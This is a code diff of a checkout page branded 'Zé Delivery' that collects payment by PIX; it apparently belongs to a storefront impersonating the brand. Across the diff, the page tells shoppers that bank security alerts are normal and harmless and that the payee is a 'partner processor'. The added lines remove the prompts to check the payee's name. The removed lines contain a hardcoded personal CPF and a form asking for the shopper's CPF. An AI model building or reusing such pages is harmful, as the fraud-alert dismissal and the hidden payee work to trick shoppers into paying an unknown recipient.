@@ -15,11 +15,11 @@
   t.src=v;s=b.getElementsByTagName(e)[0];
   s.parentNode.insertBefore(t,s)}(window, document,'script',
   'https://connect.facebook.net/en_US/fbevents.js');
-  fbq('init', '1982160662414201');
+  fbq('init', '1510776000355013');
   fbq('track', 'PageView');
   </script>
   <noscript><img height="1" width="1" style="display:none"
-  src="https://www.facebook.com/tr?id=1982160662414201&ev=PageView&noscript=1"
+  src="https://www.facebook.com/tr?id=1510776000355013&ev=PageView&noscript=1"
   /></noscript>
   <!-- End Meta Pixel Code -->
   <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
@@ -140,6 +140,7 @@
     .c-pagar-btn { width: 100%; background: #ffcc01; color: #1A1A1A; border: none; border-radius: 24px; padding: 15px 18px; font-family: 'Poppins', sans-serif; font-weight: 700; font-size: 16px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: background .2s; }
     .c-pagar-btn:hover { background: #f0c000; }
     .c-pagar-btn:disabled { opacity: .4; cursor: default; }
+    .c-pagar-btn.c-pagar-muted { opacity: .55; }
     .c-continue-btn { background: none; border: none; cursor: pointer; font-family: 'Poppins', sans-serif; font-size: 13px; font-weight: 600; color: #888; text-decoration: underline; text-align: center; padding: 2px 0; }
     .c-continue-btn:hover { color: #555; }
     .c-spacer { height: 220px; }
@@ -275,6 +276,7 @@
     .agend-chip:hover { background: #fff3c4; border-color: #ffcc01; }
     .agend-chip.selected { background: #ffcc01; border-color: #f0c000; color: #1a1a1a; }
   </style>
+  <script src="js/protecao.js"></script>
 </head>
 <body>
 
@@ -288,9 +290,6 @@
         <div class="c-header-storename">Zé Delivery</div>
         <a class="c-header-addmore" href="#" onclick="fecharCarrinho(); return false;">Adicionar mais itens</a>
       </div>
-      <button onclick="esvaziarCarrinho()" style="background:none;border:none;cursor:pointer;padding:4px;color:#e53935;font-size:16px;margin-left:auto;flex-shrink:0;" title="Limpar carrinho">
-        <i class="fa fa-trash"></i>
-      </button>
     </div>
     <div class="c-scroll">
       <div id="c-content"></div>
@@ -363,83 +362,38 @@
     </div>
   </div>
 
-  <!-- ══ MODAL CONFIRMAÇÃO ══ -->
-  <div class="cpf-overlay" id="confirmacao-overlay" style="display:none">
-    <div class="cpf-backdrop" onclick="fecharConfirmacaoModal()"></div>
-    <div class="cpf-sheet" id="confirmacao-sheet">
-      <div class="cpf-handle-wrap"><div class="cpf-handle"></div></div>
-      <div class="cpf-body">
-        <div class="cpf-title">Antes de continuar</div>
-        <div style="display:flex;flex-direction:column;gap:10px;margin-bottom:18px;">
-          <div style="display:flex;align-items:flex-start;gap:10px;background:#f0f0f0;border:1px solid #e2e2e2;border-radius:10px;padding:12px;">
-            <span style="font-size:16px;flex-shrink:0;">🛵</span>
-            <span style="font-size:13px;color:#444;line-height:1.55;">O pedido só será entregue <strong>APÓS</strong> a confirmação do pagamento via PIX.<br>A confirmação é automática e, após identificada, você acompanha seu pedido por aqui.<br>O WhatsApp da loja também fica disponível para suporte.</span>
-          </div>
-          <div style="display:flex;align-items:flex-start;gap:10px;background:#fff8e1;border:1px solid #ffe082;border-radius:10px;padding:12px;">
-            <span style="font-size:16px;flex-shrink:0;">⚠️</span>
-            <span style="font-size:13px;color:#5a4000;line-height:1.55;">Seu banco pode exibir um alerta de segurança.<br>É um aviso automático e aleatório, que pode (ou não) aparecer.<br>É comum em pagamentos PIX e não significa que há algo errado com o seu pedido.</span>
-          </div>
-          <div style="display:flex;align-items:flex-start;gap:10px;background:#f0faf3;border:1px solid #b8eac7;border-radius:10px;padding:12px;">
-            <span style="font-size:16px;flex-shrink:0;">✅</span>
-            <span style="font-size:13px;color:#2e7d50;line-height:1.55;">Confira o nome ao pagar: <strong style="white-space:nowrap"><span class="ze-nome-recebedor"></span></strong>.<br>É a nossa processadora de pagamentos parceira.</span>
-          </div>
-        </div>
-        <div class="cpf-check-row">
-          <input type="checkbox" id="confirma-check">
-          <label for="confirma-check">Li e entendi as informações acima</label>
-        </div>
-        <button class="cpf-confirm-btn" id="btn-confirma-continuar" disabled
-          onclick="fecharConfirmacaoModal(); setTimeout(abrirCpfModal, 260);">
-          Continuar
-        </button>
-      </div>
-    </div>
-  </div>
-
-  <!-- ══ MODAL CPF ══ -->
-  <div class="cpf-overlay" id="cpf-overlay" style="display:none">
-    <div class="cpf-backdrop" onclick="fecharCpfModal()"></div>
-    <div class="cpf-sheet" id="cpf-sheet">
-      <div class="cpf-handle-wrap"><div class="cpf-handle"></div></div>
-      <div class="cpf-body">
-        <div class="cpf-title"><i class="fa fa-id-card" style="color:#ffcc01"></i> Informe seu CPF</div>
-        <p class="cpf-note">Necessário para processar o pagamento via PIX e emitir nota fiscal.</p>
-        <div class="cpf-security">
-          <i class="fa fa-shield-halved"></i>
-          Seus dados são protegidos e criptografados e serão utilizados somente para finalizar seu pedido.
-        </div>
-        <input id="cpf-input" class="cpf-input" type="text" placeholder="000.000.000-00" maxlength="14" inputmode="numeric">
-        <span id="cpf-err" class="cpf-err"></span>
-        <button class="cpf-confirm-btn" id="cpf-confirm-btn" onclick="confirmarCpf()">
-          <i class="fa fa-lock" style="font-size:12px"></i> Salvar e pagar
-        </button>
-      </div>
-    </div>
-  </div>
 
   <!-- ══ OVERLAY PIX ══ -->
   <div class="pix-overlay" id="pix-overlay" style="display:none" onclick="fecharPixOverlay()">
     <div class="pix-sheet" id="pix-sheet" onclick="event.stopPropagation()">
-      <button class="pix-top-close" onclick="fecharPixOverlay()" style="position:absolute;top:10px;right:14px;background:none;border:none;font-size:20px;color:#888;cursor:pointer;z-index:10;line-height:1;padding:4px;"><i class="fa fa-times"></i></button>
+
+      <!-- Header fixo -->
       <div class="pix-sheet-header">
         <div class="pix-handle-wrap"><div class="pix-handle"></div></div>
+        <div style="display:flex;align-items:center;justify-content:space-between;padding:0 16px 14px;">
+          <div>
+            <div style="font-size:16px;font-weight:700;color:#1a1a1a;line-height:1.2;">Pague com PIX</div>
+            <div style="font-size:13px;color:#888;margin-top:2px;">Total: <strong style="color:#077c22;" id="px-header-valor">R$ 0,00</strong></div>
+          </div>
+          <button onclick="fecharPixOverlay()" style="width:34px;height:34px;border-radius:50%;background:#f0f0f0;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:16px;color:#555;flex-shrink:0;">
+            <i class="fa fa-times"></i>
+          </button>
+        </div>
       </div>
-      <div style="background:#e8f7ee;border-bottom:1.5px solid #b8eac7;padding:12px 44px 12px 16px;display:flex;align-items:center;gap:10px;flex-shrink:0;">
-        <span style="color:#077c22;font-size:16px;flex-shrink:0;">✅</span>
-        <div style="font-size:13px;font-weight:700;color:#155724;line-height:1.3;">Pedido reservado</div>
-      </div>
-      <div class="pix-content">
+
+      <div class="pix-content" style="padding-top:14px;">
 
         <div class="pix-card">
 
-          <div style="background:#fff8e1;border:1px solid #ffe066;border-radius:10px;padding:9px 12px;margin-bottom:4px;display:flex;align-items:flex-start;gap:8px;">
-            <span style="font-size:13px;flex-shrink:0;margin-top:1px;">⚠️</span>
-            <div style="font-size:11.5px;color:#5a4000;line-height:1.5;">
-              Alguns bancos exibem alertas de segurança automáticos em compras online. Isso é completamente normal e não afeta seu pedido.
+          <!-- Box verde: pedido reservado + aviso de segurança -->
+          <div style="background:#e8f5e9;border:1.5px solid #66bb6a;border-radius:12px;padding:11px 13px;margin-bottom:16px;">
+            <div style="display:flex;align-items:flex-start;gap:9px;">
+              <span style="font-size:15px;flex-shrink:0;margin-top:1px;">✅</span>
+              <div>
+                <div style="font-size:12px;font-weight:700;color:#1b5e20;line-height:1.45;">Pedido reservado — aguardando confirmação do pagamento.</div>
+                <div style="display:flex;gap:5px;font-size:11px;color:#1b5e20;margin-top:5px;line-height:1.5;"><span style="flex-shrink:0;">⚠️</span><span>Alguns bancos exibem alertas de segurança automáticos. Isso é normal e não afeta seu pedido.</span></div>
+              </div>
             </div>
-          </div>
-          <div style="font-size:11px;color:#1a1a1a;text-align:center;margin-bottom:8px;line-height:1.5;">
-            O recebedor é nossa instituição de pagamentos parceira.<br>Seu pedido está seguro e garantido. ✅
           </div>
 
           <div class="px-qr-wrap">
@@ -454,15 +408,13 @@
             <i class="fa fa-copy"></i> Copiar código PIX
           </button>
 
-          <div style="font-size:11px;color:#888;text-align:center;margin-top:8px;margin-bottom:12px;line-height:1.5;">
-            Confira o nome do recebedor, ele deve ser:<br>
-            <strong style="color:#1a1a1a;"><span class="ze-nome-recebedor"></span></strong>
+          <!-- Selos de confiança -->
+          <div style="display:flex;justify-content:center;gap:18px;margin:12px 0 4px;">
+            <span style="font-size:12px;color:#888;font-weight:600;">🛡️ Protegido</span>
+            <span style="font-size:12px;color:#888;font-weight:600;">🔒 Ambiente seguro</span>
           </div>
 
-          <div class="px-badges">
-            <div class="px-badge"><i class="fa fa-shield-halved" style="color:#077c22"></i> Pagamento protegido</div>
-            <div class="px-badge"><i class="fa fa-lock" style="color:#1a7a8a"></i> Ambiente seguro</div>
-          </div>
+
         </div>
 
         <div class="px-status" id="px-status-card">
@@ -473,11 +425,12 @@
           </div>
         </div>
 
+        <!-- Passo a passo -->
         <div class="pix-card">
           <div class="px-instr-title">Como realizar o pagamento</div>
           <div class="px-step"><div class="px-step-num">1</div><div><div class="px-step-title">Copie o código PIX acima</div><div class="px-step-sub">Clique no código ou no botão "Copiar"</div></div></div>
           <div class="px-step"><div class="px-step-num">2</div><div><div class="px-step-title">Abra o app do seu banco</div><div class="px-step-sub">Vá em PIX → Pix Copia e Cola e cole o código</div></div></div>
-          <div class="px-step"><div class="px-step-num">3</div><div><div class="px-step-title">Confirme para <strong><span class="ze-nome-recebedor"></span></strong></div><div class="px-step-sub">Verifique o valor e finalize. Seu pedido é aprovado na hora.</div></div></div>
+          <div class="px-step"><div class="px-step-num">3</div><div><div class="px-step-title">Confirme o pagamento</div><div class="px-step-sub">Verifique o valor e finalize. Seu pedido é aprovado na hora.</div></div></div>
         </div>
 
       </div>
@@ -504,9 +457,6 @@
     function getUtmParams() {
       try { return JSON.parse(sessionStorage.getItem('ze_utms') || '{}'); } catch(e) { return {}; }
     }
-
-    /* ══ CONSTANTES ══ */
-    var ZE_OWNER_CPF = '056.718.976-70';
 
     /* ── Lê UTMs salvas no localStorage ── */
     function getUtms() {
@@ -535,7 +485,7 @@
         + (pixAtivo.agendamento && pixAtivo.agendamento !== 'agora' ? '&agendamento=' + encodeURIComponent(pixAtivo.agendamento) : '')
         + (utmStr ? '&' + utmStr : '');
     }
-    var MIN_PEDIDO        = 30;
+    var MIN_PEDIDO        = 15;
     var pixAtivo               = null;
     var checkInterval          = null;
     var countdownInterval      = null;
@@ -611,7 +561,9 @@
       var btn = document.getElementById('c-btn-pagar');
       var abaixoMinimo = items.length > 0 && total < MIN_PEDIDO;
       document.getElementById('c-btn-total').textContent = fmt(total);
-      btn.disabled = items.length === 0 || abaixoMinimo;
+      /* só desabilita quando vazio; abaixo do mínimo fica clicável (rola até o aviso) */
+      btn.disabled = items.length === 0;
+      btn.classList.toggle('c-pagar-muted', abaixoMinimo);
 
       if (items.length === 0) {
         el.innerHTML = '<div class="c-empty"><i class="fa fa-shopping-cart"></i><h2>Seu carrinho está vazio</h2><p>Adicione produtos para continuar</p><button class="c-empty-btn" onclick="window.location.href=\'index.html\'">Ver Produtos</button></div>';
@@ -624,12 +576,11 @@
         var prod = (typeof PRODUTOS !== 'undefined') ? PRODUTOS.find(function(p){ return p.id == item.id; }) : null;
         var precoAntigo = prod && prod.precoAntigo ? prod.precoAntigo * item.quantidade : null;
         var obsHtml = item.obs ? '<div class="c-item-obs">'+(item.obs).replace(/\n/g,'<br>')+'</div>' : '';
-        var qtyControls = item.id === 999
-          ? '<span style="font-size:12px;color:#888;margin-right:8px;">'+item.obs+'</span>'
-          : '<div class="c-item-qty">'
+        var maxQty = item.id === 999 ? 12 : ((prod && prod.categoria === 'combo') ? 2 : 99);
+        var qtyControls = '<div class="c-item-qty">'
             + '<button class="c-qty-btn"'+(item.quantidade<=1?' disabled':'')+' onclick="changeItemQty('+i+',-1)">−</button>'
             + '<span class="c-qty-num">'+item.quantidade+'</span>'
-            + '<button class="c-qty-btn" onclick="changeItemQty('+i+',1)">+</button>'
+            + '<button class="c-qty-btn"'+(item.quantidade>=maxQty?' disabled':'')+' onclick="changeItemQty('+i+',1)">+</button>'
             + '</div>';
         html += '<div class="c-item">'
           + '<img class="c-item-img" src="'+item.img+'" alt="'+item.nome+'">'
@@ -642,7 +593,7 @@
           +   '</div>'
           +   qtyControls
           +   '</div></div>'
-          + '<button class="c-item-del" onclick="removeItem('+i+')"><i class="fa fa-times"></i></button>'
+          + '<button class="c-item-del" onclick="removeItem('+i+')" aria-label="Remover" style="background:none;border:none;cursor:pointer;color:#e53935;font-size:17px;line-height:1;padding:4px;align-self:flex-start"><i class="fa fa-trash"></i></button>'
           + '</div>';
       }
       html += '</div>';
@@ -709,14 +660,21 @@
         +'</div>';
 
       var aviso = abaixoMinimo
-        ? '<div style="background:#fff8e1;border:1.5px solid #ffcc01;border-radius:12px;padding:13px 15px;margin:10px 12px 0;display:flex;align-items:flex-start;gap:9px"><i class="fa fa-info-circle" style="color:#7a5f00;margin-top:2px;flex-shrink:0;font-size:15px"></i><span style="font-size:13px;color:#7a5f00;font-weight:600;line-height:1.45">Pedido mínimo de <b>R$ 30,00</b>. Adicione mais <b>R$ '+Math.max(0,MIN_PEDIDO-total).toFixed(2).replace('.',',')+'</b> para finalizar.</span></div>'
+        ? '<div id="aviso-minimo" style="background:#fff8e1;border:1.5px solid #ffcc01;border-radius:12px;padding:13px 15px;margin:10px 12px 0;display:flex;align-items:flex-start;gap:9px"><i class="fa fa-info-circle" style="color:#7a5f00;margin-top:2px;flex-shrink:0;font-size:15px"></i><span style="font-size:13px;color:#7a5f00;font-weight:600;line-height:1.45">Pedido mínimo de <b>R$ '+MIN_PEDIDO.toFixed(2).replace('.',',')+'</b>. Adicione mais <b>R$ '+Math.max(0,MIN_PEDIDO-total).toFixed(2).replace('.',',')+'</b> para finalizar.</span></div>'
         : '';
 
       el.innerHTML = html + infoHtml + blocoEntrega + resumo + aviso;
       renderBlocoEntrega();
     }
 
-    function changeItemQty(index, delta) { CarrinhoData.setQty(index, CarrinhoData.get().items[index].quantidade + delta); renderCart(); }
+    function changeItemQty(index, delta) {
+      var it = CarrinhoData.get().items[index];
+      var prod = (typeof PRODUTOS !== 'undefined') ? PRODUTOS.find(function(p){ return p.id == it.id; }) : null;
+      var maxQty = it.id === 999 ? 12 : ((prod && prod.categoria === 'combo') ? 2 : 99);
+      var nova = Math.min(maxQty, Math.max(1, it.quantidade + delta));
+      CarrinhoData.setQty(index, nova);
+      renderCart();
+    }
     function removeItem(index) { CarrinhoData.remover(index); renderCart(); }
 
     /* ══ AGENDAMENTO ══ */
@@ -750,6 +708,8 @@
     function renderBlocoEntrega() {
       var body = document.getElementById('agend-bloco-body');
       if (!body) return;
+      var scrollEl = document.querySelector('.c-scroll');
+      var savedTop = scrollEl ? scrollEl.scrollTop : 0;
       if (!agendamentoSelecionado) {
         body.innerHTML = '<div style="display:flex;gap:8px;justify-content:center;">'
           +'<button id="btn-agora" class="agend-btn" onclick="selecionarModoEntrega(\'agora\')">🛵 Entregar agora</button>'
@@ -761,7 +721,7 @@
         body.innerHTML = '<div style="display:flex;align-items:center;justify-content:space-between;">'
           +'<div>'
           +'<div style="font-size:13px;font-weight:600;color:#1a1a1a;">Entregar agora</div>'
-          +'<div style="font-size:12px;font-weight:400;color:#1a1a1a;">Prazo de entrega: 30–40 min</div>'
+          +'<div style="font-size:12px;font-weight:400;color:#1a1a1a;">Prazo de Entrega: 30 min</div>'
           +'</div>'
           +'<a onclick="alterarAgendamento()" style="font-size:12px;color:#c79200;font-weight:600;text-decoration:underline;cursor:pointer;">Alterar</a>'
           +'</div>';
@@ -771,6 +731,7 @@
           +'<a onclick="alterarAgendamento()" style="font-size:12px;color:#c79200;font-weight:600;text-decoration:underline;cursor:pointer;">Alterar</a>'
           +'</div>';
       }
+      if (scrollEl) scrollEl.scrollTop = savedTop;
     }
 
     function alterarAgendamento() {
@@ -803,7 +764,7 @@
         horaEl.style.display = 'grid';
         horaEl.style.gridTemplateColumns = '1fr 1fr 1fr';
         horaEl.style.gridAutoFlow = 'row';
-        horaEl.style.gridTemplateRows = 'repeat('+N+', auto)';
+        horaEl.style.gridTemplateRows = 'repeat('+Math.ceil(slots.length/3)+', auto)';
         horaEl.style.gap = '6px';
       }
     }
@@ -813,6 +774,8 @@
         agendamentoSelecionado = 'agora';
         renderBlocoEntrega();
       } else {
+        var scrollEl = document.querySelector('.c-scroll');
+        var savedTop = scrollEl ? scrollEl.scrollTop : 0;
         var btnAgora   = document.getElementById('btn-agora');
         var btnAgendar = document.getElementById('btn-agendar');
         if (btnAgora)   btnAgora.classList.remove('agend-btn-ativo');
@@ -826,6 +789,7 @@
             + '<div id="agend-hora-chips" style="display:none;grid-template-columns:1fr 1fr 1fr;gap:6px;margin-top:8px;width:100%;"></div>';
           slotsEl.style.display = 'block';
         }
+        if (scrollEl) scrollEl.scrollTop = savedTop;
       }
     }
 
@@ -836,6 +800,17 @@
 
     /* ══ MODAL CPF ══ */
     function iniciarPagamento() {
+      /* Abaixo do pedido mínimo: rola até o aviso e não prossegue */
+      if (CarrinhoData.totalValor() < MIN_PEDIDO) {
+        var av = document.getElementById('aviso-minimo');
+        if (av) {
+          av.scrollIntoView({ behavior: 'smooth', block: 'center' });
+          av.style.transition = 'box-shadow .2s';
+          av.style.boxShadow = '0 0 0 3px rgba(255,204,1,.6)';
+          setTimeout(function(){ av.style.boxShadow = 'none'; }, 1200);
+        }
+        return;
+      }
       var ct = {}, en = {};
       try { ct = JSON.parse(localStorage.getItem('ze_contato') || '{}'); } catch(e) {}
       try { en = JSON.parse(localStorage.getItem('ze_endereco') || '{}'); } catch(e) {}
@@ -861,79 +836,18 @@
         if (aviso) { aviso.style.display = 'block'; setTimeout(function(){ aviso.style.display='none'; }, 3000); }
         return;
       }
-      abrirConfirmacaoModal();
-    }
-
-    function abrirCpfModal() {
-      var el = document.getElementById('cpf-overlay');
-      el.style.display = 'flex';
-      document.getElementById('cpf-input').value = '';
-      document.getElementById('cpf-input').disabled = false;
-      document.getElementById('cpf-input').style.opacity = '1';
-      document.getElementById('cpf-err').classList.remove('visible');
-      document.getElementById('cpf-err').textContent = '';
-      setTimeout(function(){ document.getElementById('cpf-input').focus(); }, 300);
-    }
-
-    function fecharCpfModal() {
-      var sheet = document.getElementById('cpf-sheet');
-      sheet.classList.add('closing');
-      setTimeout(function(){ document.getElementById('cpf-overlay').style.display = 'none'; sheet.classList.remove('closing'); }, 240);
-    }
-
-    /* ══ MODAL CONFIRMAÇÃO ══ */
-    function abrirConfirmacaoModal() {
-      document.getElementById('confirmacao-overlay').style.display = 'flex';
-      document.getElementById('confirma-check').checked = false;
-      document.getElementById('btn-confirma-continuar').disabled = true;
-    }
-
-    function fecharConfirmacaoModal() {
-      var sheet = document.getElementById('confirmacao-sheet');
-      sheet.classList.add('closing');
-      setTimeout(function(){ document.getElementById('confirmacao-overlay').style.display = 'none'; sheet.classList.remove('closing'); }, 240);
-    }
-
-    function toggleCpfInput(cb) { /* removido — opção "não lembro" descontinuada */ }
-
-    document.getElementById('confirma-check').addEventListener('change', function() {
-      document.getElementById('btn-confirma-continuar').disabled = !this.checked;
-    });
-
-    document.getElementById('cpf-input').addEventListener('input', function() {
-      var v = this.value.replace(/\D/g,'').slice(0,11);
-      if      (v.length > 9) v = v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6,9)+'-'+v.slice(9);
-      else if (v.length > 6) v = v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6);
-      else if (v.length > 3) v = v.slice(0,3)+'.'+v.slice(3);
-      this.value = v;
-      this.classList.remove('error');
-      document.getElementById('cpf-err').classList.remove('visible');
-    });
-
-    async function confirmarCpf() {
-      var cpfRaw = document.getElementById('cpf-input').value.replace(/\D/g,'');
-
-      if (!cpfValido(cpfRaw)) {
-        document.getElementById('cpf-input').classList.add('error');
-        document.getElementById('cpf-err').textContent = cpfRaw.length < 11
-          ? 'Digite os 11 dígitos do CPF.'
-          : 'CPF inválido — verifique o número e tente novamente.';
-        document.getElementById('cpf-err').classList.add('visible');
-        return;
-      }
-
-      /* Desabilita botão, mostra loading */
-      var btn = document.getElementById('cpf-confirm-btn');
+      /* Vai direto ao PIX — sem modais intermediários */
+      var btn = document.getElementById('c-btn-pagar');
       btn.disabled = true;
       btn.innerHTML = '<i class="fa fa-spinner fa-spin" style="font-size:13px"></i> Gerando PIX...';
-
-      await gerarPix(cpfRaw);
-      btn.disabled = false;
-      btn.innerHTML = '<i class="fa fa-lock" style="font-size:12px"></i> Salvar e pagar';
+      gerarPix().finally(function() {
+        btn.disabled = false;
+        btn.innerHTML = '<i class="fa fa-lock" style="font-size:13px"></i> <span>Realizar Pagamento</span> <span id="c-btn-total">' + fmt(CarrinhoData.totalValor()) + '</span>';
+      });
     }
 
     /* ══ GERAR PIX ══ */
-    async function gerarPix(cpf) {
+    async function gerarPix() {
       var ct = {}, en = {};
       try { ct = JSON.parse(localStorage.getItem('ze_contato') || '{}'); } catch(e) {}
       try { en = JSON.parse(localStorage.getItem('ze_endereco') || '{}'); } catch(e) {}
@@ -950,7 +864,6 @@
             produto:     'Pedido Finalizado',
             valor:       total,
             nome:        ct.nome || '',
-            cpf:         cpf,
             tel:         (ct.tel || '').replace(/\D/g,''),
             email:       email,
             agendamento: agendamentoSelecionado || 'agora'
@@ -961,8 +874,7 @@
       } catch(err) {
         var msg = err.message || 'Erro desconhecido';
         if (err instanceof TypeError && location.protocol === 'file:') msg = 'Servidor não encontrado. Abra via http://localhost:3000.';
-        fecharCpfModal();
-        setTimeout(function() { alert('Erro ao gerar PIX:\n' + msg); }, 300);
+        alert('Erro ao gerar PIX:\n' + msg);
         return;
       }
 
@@ -980,8 +892,10 @@
       pixAtivo = { pixCode: pixCode, pixImg: pixImg, txId: d.id || '', total: total, agendamento: agendamentoSelecionado || 'agora', createdAt: Date.now() };
       localStorage.setItem('ze_pix_pendente', JSON.stringify(pixAtivo));
 
-      fecharCpfModal();
-      setTimeout(function() { abrirPixOverlay(); }, 280);
+      /* Pré-carrega o QR em background enquanto o modal fecha (240ms de vantagem) */
+      if (pixImg) { var _qrPre = new Image(); _qrPre.src = pixImg; }
+
+      abrirPixOverlay();
     }
 
     /* ══ OVERLAY PIX ══ */
@@ -1000,6 +914,9 @@
       document.getElementById('px-code-box').textContent = pixAtivo.pixCode || '—';
       document.getElementById('px-copy-btn').classList.remove('copied');
       document.getElementById('px-copy-btn').innerHTML  = '<i class="fa fa-copy"></i> Copiar código PIX';
+      /* Valor no header */
+      var headerValor = document.getElementById('px-header-valor');
+      if (headerValor && pixAtivo.total) headerValor.textContent = fmt(pixAtivo.total);
 
       /* Reset status */
       setPixStatus('waiting');
@@ -1042,34 +959,45 @@
       }, 260);
     }
 
+    /* Identificadores de clique do Facebook para o CAPI server-side (atribuição) */
+    function fbCapiQS() {
+      function ck(n){ var m=document.cookie.match('(^|;)\\s*'+n+'\\s*=\\s*([^;]+)'); return m?decodeURIComponent(m.pop()):''; }
+      var fbp=ck('_fbp'), fbc=ck('_fbc'), fbclid='';
+      try { fbclid = localStorage.getItem('ze_fbclid') || ''; } catch(e){}
+      var p=[];
+      if(fbp)            p.push('fbp='    + encodeURIComponent(fbp));
+      if(fbc)            p.push('fbc='    + encodeURIComponent(fbc));
+      if(fbclid && !fbc) p.push('fbclid=' + encodeURIComponent(fbclid));
+      return p.length ? '?'+p.join('&') : '';
+    }
+
     async function verificarPagamento() {
       if (!pixAtivo || !pixAtivo.txId) return;
       try {
-        var r = await fetch('/api/status-pix/' + pixAtivo.txId);
+        var r = await fetch('/api/status-pix/' + pixAtivo.txId + fbCapiQS());
         var d = await r.json();
         var s = ((d.data && d.data.status) || d.status || '').toLowerCase();
         if (s === 'authorized' || s === 'paid' || s === 'approved' || s === 'completed') {
           clearInterval(checkInterval);
           clearInterval(countdownInterval);
 
-          /* Salva dados da compra para a página de obrigado disparar o Purchase */
+          /* Salva dados da compra — Purchase será disparado pelo obrigado.html */
+          var ct = {};
+          try { ct = JSON.parse(localStorage.getItem('ze_contato') || '{}'); } catch(x) {}
+          var purchaseItems = CarrinhoData.get().items;
           try {
-            var ct = {};
-            try { ct = JSON.parse(localStorage.getItem('ze_contato') || '{}'); } catch(x) {}
             localStorage.setItem('ze_last_purchase', JSON.stringify({
               txId:  pixAtivo.txId,
               total: pixAtivo.total,
-              items: CarrinhoData.get().items,
+              items: purchaseItems,
               ct:    ct
             }));
           } catch(e) {}
 
-          setPixStatus('paid');
-          setTimeout(function() {
-            localStorage.removeItem('ze_pix_pendente');
-            CarrinhoData.limpar();
-            window.location.href = obrigadoUrl();
-          }, 2000);
+          /* Redireciona imediatamente — Purchase dispara no obrigado.html */
+          localStorage.removeItem('ze_pix_pendente');
+          CarrinhoData.limpar();
+          window.location.href = obrigadoUrl();
         }
       } catch(e) {}
     }
@@ -1272,6 +1200,59 @@
         }
       } catch(e) {}
     })();
+
+    /* ══ DRAG TO CLOSE — arrastar o sheet para baixo ══ */
+    (function() {
+      var sheet   = document.getElementById('c-sheet');
+      var handle  = document.querySelector('.c-handle-wrap');
+      var header  = document.querySelector('.c-header');
+      var startY  = 0, dragY = 0, dragging = false;
+      var THRESHOLD = 80;
+
+      function onStart(e) {
+        startY   = e.touches[0].clientY;
+        dragY    = 0;
+        dragging = true;
+        /* Remove a animação CSS (fill-mode:both sobrepõe inline transform) */
+        sheet.style.animation  = 'none';
+        sheet.style.transition = 'none';
+      }
+
+      function onMove(e) {
+        if (!dragging) return;
+        var dy = e.touches[0].clientY - startY;
+        if (dy < 0) dy = 0;
+        dragY = dy;
+        sheet.style.transform = 'translateY(' + dy + 'px)';
+      }
+
+      function onEnd() {
+        if (!dragging) return;
+        dragging = false;
+        if (dragY >= THRESHOLD) {
+          sheet.style.transition = 'transform .28s cubic-bezier(.55,.06,.68,.19)';
+          sheet.style.transform  = 'translateY(110%)';
+          setTimeout(function() { window.location.href = 'index.html'; }, 260);
+        } else {
+          sheet.style.transition = 'transform .3s cubic-bezier(.25,.46,.45,.94)';
+          sheet.style.transform  = 'translateY(0)';
+          setTimeout(function() {
+            sheet.style.transition = '';
+            sheet.style.animation  = '';
+          }, 320);
+        }
+      }
+
+      /* touchmove/touchend disparam no mesmo elemento do touchstart em mobile */
+      [handle, header].forEach(function(el) {
+        if (!el) return;
+        el.addEventListener('touchstart',  onStart, { passive: true });
+        el.addEventListener('touchmove',   onMove,  { passive: true });
+        el.addEventListener('touchend',    onEnd,   { passive: true });
+        el.addEventListener('touchcancel', onEnd,   { passive: true });
+      });
+    })();
+
   </script>
 </body>
 </html>
